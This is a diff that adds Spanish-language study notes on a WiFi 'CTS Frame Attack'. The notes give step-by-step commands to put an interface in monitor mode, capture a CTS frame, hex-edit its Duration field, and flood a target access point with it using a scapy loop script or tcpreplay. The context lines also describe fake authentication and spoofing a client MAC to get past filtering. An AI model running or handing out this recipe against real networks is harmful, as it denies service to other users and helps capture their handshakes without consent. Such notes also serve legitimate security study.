@@ -397,3 +397,78 @@ Donde:
 - **Identificación de autenticaciones fallidas**: Si `aireplay-ng` muestra mensajes como "Got a deauthentication packet!" o reintentos continuos, indica que la autenticación está fallando. Se puede usar `tcpdump` para analizar los paquetes y buscar mensajes de error como "DeAuthentication: Class 3 frame received from nonassociated station", lo que significa que el AP no aceptará los paquetes inyectados.
 - **Reasociación**: Algunos APs requieren reasociación periódica (ej. cada 30 segundos). En estos casos, es necesario fijar el periodo de reasociación en el comando `aireplay-ng`.
 - **Filtrado MAC**: Si la falsa autenticación nunca tiene éxito, el AP podría tener filtrado MAC activado. La solución es averiguar una dirección MAC válida de un cliente ya asociado (usando `airodump-ng`) y usarla. No se debe intentar la falsa autenticación con una MAC de un cliente activo.
+
+## 12 y 13. CTS Frame Attack (Secuestro del Ancho de Banda de una red)
+
+### Descripción del Ataque
+
+El ataque CTS (Clear To Send) Frame Attack es una técnica de denegación de servicio (DoS) que explota el mecanismo de control de flujo RTS/CTS (Request To Send/Clear To Send). Este ataque busca monopolizar el ancho de banda de una red inalámbrica al inundarla con tramas CTS falsas con una duración muy larga. El objetivo es causar una contención artificial en la red, lo que interrumpe o interfiere con la conexión inalámbrica de otros clientes, llegando incluso a desautenticarlos para facilitar la captura de un handshake (similar a un ataque de desautenticación).
+
+El mecanismo RTS/CTS es un esquema de reserva utilizado en redes inalámbricas para evitar colisiones de datos, especialmente en entornos con nodos ocultos. Un nodo que desea transmitir envía una trama RTS, y el AP responde con una trama CTS, indicando a todos los demás nodos que deben esperar antes de transmitir. El ataque CTS abusa de esto enviando tramas CTS falsas con una duración excesivamente larga, haciendo que otros dispositivos permanezcan en silencio y no puedan transmitir datos.
+
+### Funcionamiento y Herramientas
+
+Para realizar este ataque, se requiere la creación o modificación de una trama CTS con una duración (Duration) muy larga. El proceso general implica:
+
+1. **Monitorizar la red**: Poner la interfaz inalámbrica en modo monitor y usar `airodump-ng` para escanear la red y obtener el BSSID del AP objetivo.
+
+    ```bash
+airmon-ng check kill && airmon-ng start wlan0mon
+airodump-ng -c <num> -w <archivo> --bssid 12:34:56:78:9a:bc  wlan0
+    ```
+
+2. **Capturar y modificar una trama CTS**:  usar Wireshark ( NO USAR airodump, a veces da falsos positivos y la duración es 0 ).
+- con el filtro `wlan.fc.type_subtype == 28`. 
+- Una vez capturada, le hacemos clic en uno y File → Export Specified Packets → Export as: Wireshark/tcpdump/.. -pcap → Selected packets only 
+- Utilizar `ghex` para modificar su campo `Duration` a un valor (máximo: 30000 microsegundos). Importante, la representación es little-endian (1º menos significativo).
+    - los 4 pares del final es Fts
+    - los 6 anteriores es la mac del PA
+    - los 2 anteriores es la duración en `micro segundos`
+
+3. Si queremos una duración (ej: 30000)
+```bash
+ghex <nombreCTSframe>
+python3
+hex(30000)
+# → 0x7530    MUY IMP ⇒ es little endian ⇒ 3075
+wireshark <nombreCTSframe> # comprobar que el paquete es válido y no se produce error
+```
+
+- si queremos atacar a otro PA hay que cambiar el valor hexadecimal al de éste
+
+4. **Inyectar la trama CTS modificada**: Una vez modificada la trama, se utiliza `tcpreplay`, `mdk4` o `scapy` para inyectar repetidamente la trama CTS falsa en la red.
+- Usando Scapy:
+```bash
+nano replay.py
+```
+
+```bash
+#!/usr/bin/env python3
+from scapy.all import *
+
+# Ruta a tu pcap
+pkts = rdpcap("CTS-frame-attack.pcap")
+
+# Envía en bucle cada paquete con un retardo mínimo
+for pkt in pkts:
+    sendp(pkt, iface="wlan0", inter=0.001, loop=1)
+```
+
+```bash
+sudo python3 replay.py
+```
+Recordar:
+- Tener la interfaz de red en modo monitor y que permita inyectar paquetes
+- modificar la ruta al .pcap
+- modificar el nombre de la interfaz de red
+
+
+Tcpreplay y mdk4 a veces fallan.
+
+```bash
+tcpreplay --intf1=wlan0mon --topspeed --loop=2000 <nombreCTSframe.pcap> 2>/dev/null
+```
+    
+    - `--intf1`: la interfaz.
+    - `--topspeed`: Envía las tramas a la máxima velocidad posible.
+    - `--loop`: Especifica la cantidad de veces que se enviará la trama.
